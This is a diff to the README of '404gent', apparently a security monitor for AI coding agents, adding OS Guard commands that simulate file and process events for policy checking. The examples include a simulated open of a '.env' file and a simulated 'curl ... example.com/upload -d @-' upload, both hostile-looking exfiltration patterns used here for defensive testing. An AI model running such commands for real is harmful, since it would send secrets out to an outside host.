@@ -33,9 +33,22 @@
 ```bash
 404gent agent --name codex --prompt "Summarize README" -- codex
 404gent agent --name demo --prompt "Run diagnostic" -- node -e 'console.log("safe")'
+404gent agent --name demo --with-os-guard -- node -e 'console.log("safe")'
 ```
 
 `agent` scans the prompt before launch, scans the launch command, monitors output, writes per-agent audit sources, and updates cmux status when cmux is available.
+
+`--with-os-guard` records simulated OS Guard coverage for the agent. It does not attach native macOS EndpointSecurity hooks.
+
+## OS Guard
+
+```bash
+404gent os-guard status
+404gent os-guard simulate-open .env --agent demo --pid 1234
+404gent os-guard simulate-exec curl https://example.com/upload -d @- --agent demo --pid 1234
+```
+
+OS Guard commands simulate file/process events and send them through normal policy, audit, status, and cmux reporting. See `docs/OS_GUARD.md`.
 
 ## Rules
 
@@ -92,6 +105,7 @@ Doctor checks:
 - Node.js version
 - rule validity
 - audit log path writability
+- OS Guard mode
 - cmux availability
 - Gemini API key when LLM review is enabled
 
